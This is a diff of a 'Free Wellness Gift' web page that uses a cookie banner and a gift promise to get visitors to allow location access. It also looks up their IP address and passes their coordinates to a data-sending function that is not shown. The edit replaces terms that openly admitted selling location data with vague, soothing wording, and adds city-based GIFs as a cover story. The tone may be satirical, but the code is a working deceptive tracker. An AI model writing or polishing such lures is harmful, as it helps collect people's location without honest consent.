@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free Wellness Gift</title>
+  <title>Free Wellness <b>Gif</b>t</title>
   <style>
     body {
       margin: 0;
@@ -33,25 +33,25 @@
   <div class="container">
     <div id="cookieConsent">
       <h2>This site uses cookies</h2>
-      <p>We use cookies to enhance your compliance. Do you accept?</p>
+      <p>We use cookies to personalise your free experience. Do you accept?</p>
       <button onclick="acceptCookies()">Accept</button>
       <button onclick="denyCookies()">Decline</button>
     </div>
 
     <div id="locationRequest" class="hidden">
       <h2>Almost there...</h2>
-      <p>Please allow location access to receive your gift.</p>
+      <p>Please allow location access so we can tailor your gift to your city.</p>
       <button onclick="requestLocation()">Allow Location</button>
       <button onclick="denyLocation()">Decline</button>
     </div>
 
     <div id="giftPage" class="hidden">
-      <h1>Welcome to your Free Wellness Gift</h1>
-      <p>Access granted. You're exactly where you need to be.</p>
-      <div id="gif-container"><img src="https://media.giphy.com/media/l4FGuhL4U2WyjdkaY/giphy.gif" alt="gift" width="100%"></div>
+      <h1>Loading your local gift...</h1>
+      <p id="locationStatus">Fetching city-specific delight...</p>
+      <div id="gif-container"></div>
       <a href="#" class="terms-link" onclick="document.getElementById('terms').style.display = 'block'; return false;">terms & conditions</a>
       <div id="terms" class="terms">
-        <p>By accessing this page, you grant LOVE SUCKER LOUNGE CORP unrestricted rights to collect, archive, and monetise your real-time location. This data may be sold, bartered, or used in AI training to improve your future compliance.</p>
+        <p>By accessing this page, you grant LOVE SUCKER LOUNGE CORP rights to archive and creatively utilise your location for inspirational purposes. The gift is yours to enjoy.</p>
         <p>Namaste.</p>
       </div>
     </div>
@@ -74,6 +74,14 @@
   <script>
     let cookiesAccepted = false;
     let ipAddress = '';
+
+    const gifs = [
+      'https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif',
+      'https://media.giphy.com/media/l0Exk8EUzSLsrErEQ/giphy.gif',
+      'https://media.giphy.com/media/l0IylOPCNkiqOgMyA/giphy.gif',
+      'https://media.giphy.com/media/3o7aCUqT2v5CffZ2Zi/giphy.gif',
+      'https://media.giphy.com/media/xUOxf3Z1YwSMP0bP6U/giphy.gif'
+    ];
 
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -110,6 +118,14 @@
           function(position) {
             showGiftPage();
             sendData(position.coords.latitude, position.coords.longitude);
+            fetch(`https://nominatim.openstreetmap.org/reverse?lat=${position.coords.latitude}&lon=${position.coords.longitude}&format=json`)
+              .then(res => res.json())
+              .then(data => {
+                const city = data.address.city || data.address.town || data.address.village || 'your area';
+                document.getElementById('locationStatus').innerText = `Here's a gift chosen for ${city}`;
+                const gifUrl = gifs[Math.floor(Math.random() * gifs.length)];
+                document.getElementById('gif-container').innerHTML = `<img src="${gifUrl}" alt="gift" width="100%">`;
+              });
           },
           function(error) {
             showDenied();
